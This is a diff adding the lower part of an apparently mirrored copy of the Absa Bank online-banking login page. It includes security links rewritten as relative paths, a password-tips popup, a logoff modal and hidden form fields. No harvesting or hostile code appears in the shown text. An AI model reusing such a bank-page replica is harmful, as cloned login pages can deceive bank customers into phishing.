+								<div class="ap-column-1">
+									
+									<!-- Security Centre Links Bottom left of Login page 1 -->
+									<div id="divsecuritycentre" class="ap-login-block-rounded">
+										<!-- top round borders -->
+										<div class="ap-login-block-rounded-top">
+											<div class="ap-corners-rounded-top-left"></div>
+											<div class="ap-corners-rounded-top"></div>
+											<div class="ap-corners-rounded-top-right"></div>
+										</div>
+										
+										<!-- content -->
+										<div role="tablist" class="ui-tabBox">
+											<ul class="ui-tabHeads">
+												<li aria-selected="true"
+													class="ui-tabHead ui-tab-selected"
+													role="button"
+													tabindex="18">
+													Security centre
+													<span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span>
+												</li>
+											</ul>
+											<div class="ui-tabBodies">
+												<div tabindex="19" role="tabpanel"
+													class="ui-tabBody ui-tabBody-selected">
+													<div style="background: #FFFFFF;">
+														<ul class="abc">
+															<li><a href='../../../../../../../www.absa.co.za/security-centre/online-security.html' id='am' target='_new'>Absa's online security measures</a></li><li><a href='../../../../../../../www.absa.co.za/security-centre/online-security.html' id='am' target='_new'>Important information about phishing</a></li><li><a href='../../../../../../../www.absa.co.za/security-centre/online-security.html' id='am' target='_new'>Protect yourself online</a></li><li><a href='../../../../../../../www.absa.co.za/security-centre/online-security.html' id='am' target='_new'>Online shopping and 3D Secure</a></li><li><a href='../../../../../../../www.absa.co.za/security-centre/tips-and-tools/scams.html' id='am' target='_new'>Latest scams</a></li><li><a href='../../../../../../../www.absa.co.za/security-centre/tips-and-tools/antivirus-software.html' id='am' target='_new'>Latest internet security software</a></li>
+														</ul>
+													</div>
+												</div>
+											</div>
+										</div>
+										
+										<!-- bottom round borders -->
+										<div class="ap-login-block-rounded-bottom">
+											<div class="ap-corners-rounded-bottom-left"></div>
+											<div class="ap-corners-rounded-bottom"></div>
+											<div class="ap-corners-rounded-bottom-right"></div>
+										</div>
+									</div>
+								</div>
+								
+								<!-- ap-column-2 -->
+								<div class="ap-column-2">
+									<div><a href='../../../../../../../www.absa.co.za/security-centre/online-security/index.html'><img src='../../../../../../../ib.absa.co.za/absa-online/assets/Assets/Richmedia/Absaonline/Images/orange_banner_en_1.jpg' alt=''></a></div>
+								</div>
+								
+								<!-- ap-column-3 -->
+								<div class="ap-column-3">
+									<div><a href='../../../../../../../www.absa.co.za/security-centre/online-security/index.html'><img src='../../../../../../../ib.absa.co.za/absa-online/assets/Assets/Richmedia/Absaonline/CampaignImages/Eng/orange_banner_en_2.jpg' alt='AOL Express'></a></div>
+								</div>
+							</div>
+						</div>
+						
+						<!-- bottom rounded corners -->
+						<div class="ap-container-bottom ap-heading-titlebar-item ap-container-bottom-show">
+							<div class="ap-corners-rounded-bottom-left"></div>
+							<div class="ap-corners-rounded-bottom"></div>
+							<div class="ap-corners-rounded-bottom-right"></div>
+						</div>
+					</div>
+				</div>
+				
+				<!-- Page bottom corners -->
+				<div class="ap-main-content-wrapper-bottom">
+					<div class="ap-corners-rounded-bottom-left"></div>
+					<div class="ap-corners-rounded-bottom"></div>
+					<div class="ap-corners-rounded-bottom-right"></div>
+				</div>
+			</div>
+			
+			<div class="ap-footer" tabIndex="20">
+				<div style="position:relative; top:0px; left:0px; width:971px;">
+					<div class="ap-footer-links">
+						<ul><li><a href='../../../../../../../www.absa.co.za/security-centre/online-security.html' id='am' target='_new'>Security centre</a></li><li><a href='../../../../../../../www.absa.co.za/content/dam/south-africa/absa/pdf/legal/Terms-of-Use-en.pdf' id='am' target='_new'>Terms of use</a></li><li><a href='../../../../../../../www.absa.co.za/legal-and-compliance/browser-requirements.html' id='am' target='_new'>Software requirements</a></li><li><a href='../../../../../../../www.absa.co.za/about-us/absa-bank/corporate-information.html' id='am' target='_new'>Banking regulations</a></li></ul>
+					</div>
+					<P tabIndex="21">
+					&#169; Copyright. Absa Bank Limited. Registration Number: 1986/004794/06<br />
+					Authorized financial services and registered credit provider NCRP7
+					</P>
+					<!-- Barclays Logo Link bottom right of page -->
+					<div style="position:absolute; top:0px; right:0px; width:220px; text-align:right;">
+						<!-- <a href="http://www.barclays.com" target="_new"><img src="https://ib.absa.co.za/absa-online/static/style/resources/barclays_logo.gif" border="0" alt="Member of the Barclays group"></a> -->
+						<!-- =xl.getImage("Images/Image/Barclays",lang) -->
+					</div>
+				</div>
+			</div>
+		</div>
+		
+		
+		<!-- password tips -->
+		<div class="modalPasswordTips" style="display: none; width: 600px; height: 443px; z-index: 200;">
+			<div class="ap-popup">
+				<div class="ap-popup-header"><b>Password tips</b>
+					<div class="clear-both"></div>
+				</div>
+				<div class="ap-popup-body ap-info-box">
+					<ul class="ap-info-box-ul">
+						<li>Never save your password/PIN on your desktop - as it may allow others to access your personal information, without your permission.</li>
+						<li>Do not make your passwords too personal - rather create passwords that have letters and numbers that cannot be attributed to you.</li>
+						<li>Never provide your Online ID or password/PIN to anyone, never write them down or share them, not even with a bank official.</li>
+						<li>Never provide your Online ID or password/PIN to anyone.</li>
+						<li>Only provide your online password or ID when your browser shows a Secure Socket Layer(SSL) connection directly to the bank.</li>
+						<li>Do not leave your computer unattended after you have entered your Absa Online password.</li>
+						<li>Always log or sign off at the end of a session.</li>
+						<li>For your security</li>
+						<li>Do not open e-mails from unknown sources.</li>
+						<li>Beware of emails that ask for passwords, PINS, credit and debit card information.</li>
+						<li>Avoid doing Internet Banking/ Absa Online in public areas such internet cafes as you never know what software is loaded that may compromise your transactions.</li>
+						<li>Make sure no one has unauthorised access to your PC.</li>
+						<li>Be especially aware that there are no security cameras trained on your PC and keyboard.</li>
+						<li>Ensure you have the latest anti virus software applications loaded on your PC and mobile devices.</li>
+						<li>Make sure the software on your PC is correctly licensed.</li>
+						<li>Update your operating system and browser with latest patches.</li>
+						<li>Install personal firewall on your PC if you use a dial-up modem.</li>
+						<li>Only provide your credit card details to reputable companies.</li>
+						<li>To ensure that you are using a secure shopping site, look for the lock and key and security certificates online.</li>
+					</ul>
+				</div>
+				<div class="ap-popup-footer" style="text-align:right;">
+					<button onclick="phe.modal.hideModal()" type="submit" tabindex="0" class="ui-button ap-button-extra">
+						<div class="ui-button-left">
+							<div class="ui-button-right">
+								<div role="button" tabindex="22" class="ui-button-center">Ok</div>
+							</div>
+						</div>
+					</button>
+				</div>
+			</div>
+		</div>
+		
+		<!-- LOGOUT POPUP -->
+		<div class="ui-modal modalLogoffWarning" id="modalLogoffWarning" style="display:none">
+			<div class="ui-modalHeader">
+				<div class="ui-modalHeader-title">Logoff</div>
+				<div class="ui-modalHeader-icons"></div>
+			</div>
+			<div class="ui-modalBody">
+				<div style="padding:10px;">
+					<div>Your Absa Online session is about to expire in <span class="ap-popup-body-timer" id="timerSeconds"></span> seconds</div>
+				 	<div>Do you want to continue?</div>
+			 	</div>
+			</div>
+			<div class="ui-modalFooter">
+				<button type="button" class="ui-button ap-button-back" style="position:static; margin-left:0px;" onclick="absa.login.doLogout()">
+					<div class="ui-button-left">
+						<div class="ui-button-right">
+							<div class="ui-button-center">Logoff</div>
+						</div>
+					</div>
+				</button>
+				<button type="button" class="ui-button ap-button-next" onclick="absa.login.resetTimer2(); phe.modal.hideModal()">
+					<div class="ui-button-left">
+						<div class="ui-button-right">
+							<div class="ui-button-center">Continue</div>
+						</div>
+					</div>
+				</button>
+			</div>
+		</div>
+		
+		<!-- hidden stuff -->
+		<form novalidate>
+			<input type="hidden" name="focusfield" id="focusfield" value="" />
+			<input type="hidden" name="lang" id="lang" value="en" />
+			<input type="hidden" name="fstoreURL" id="fstoreURL" value="https://fs.absa.co.za/featuresstore/" />
+			<input type="hidden" name="fstore" id="fstore" value="false" />
+			<input type="hidden" name="fsid" id="fsid" value="0" />
+			<input type="hidden" name="dspURL" id="dspURL" value="https://e.absa.co.za/dspt/" />
+			<input type="hidden" name="dsp" id="dsp" value="false" />
+			<input type="hidden" name="dspid" id="dspid" value="0" />
+			<input type="hidden" name="dspWindowSelf" id="dspWindowSelf" value="null" />
+			<input type="hidden" name="landingpage" id="landingpage" value="" />
+			<input type="hidden" name="goto" id="goto" value="" />
+		</form>
+		
+		<script type="application/backbase+xml"
+			xmlns:xi="http://www.w3.org/2001/XInclude"
+			xmlns:ui="http://www.absa.co.za/2009/ui"
+			xmlns:e="http://www.backbase.com/2006/xel"
+			xmlns:simple="http://ws.online.absa.co.za/common/simpleTypes">
+			
+			<ui:basicElement e:behavior="ui:form ui:tooltip ui:helpText ui:modal ui:button ui:loadingMessage ui:message ui:keypad ui:keyboard" viewNode="#bodydiv" >
+				<e:handler event="DOMNodeInsertedIntoDocument" type="application/javascript">
+					absa.initializeNewContent(this.viewNode);
+				</e:handler>
+			</ui:basicElement>
+		</script>
+		
+		<!-- Please wait controller -->
+		<script type="application/backbase+xml" xmlns:e="http://www.backbase.com/2006/xel">
+			<e:handler event="DOMNodeInsertedIntoDocument" type="application/javascript">
+				absa.hidePleaseWait();
+				// Move focus to first form field
+				var tmpUN = document.getElementById("j_username");
+				if (tmpUN != null) tmpUN.focus();
+			</e:handler>
+		</script>
+		<script type="text/javascript">
+			absa.showPleaseWait("<p class=\"vi-screenreader-line\">Please wait</p>");
+			absa.login.init();
+		</script>
+		
+		
+	</body>
+</html>
